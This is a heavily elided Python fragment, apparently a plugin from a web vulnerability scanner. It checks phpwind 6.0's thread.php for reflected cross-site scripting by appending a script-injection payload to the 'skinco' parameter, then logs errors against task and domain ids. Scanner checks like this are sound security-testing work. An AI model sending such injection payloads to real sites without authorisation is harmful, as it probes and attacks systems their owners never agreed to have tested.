...
def run_domain(http,ob):
    ...
    try:
        ...
        url+="thread.php?skinco=black\"><script>alert(111)</script>"
        ...
        logging.getLogger().error("File:phpwind6.0_thread.phpXSS.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:phpwind6.0_thread.phpXSS.py, run_domain function :" + str(e))
    #end try
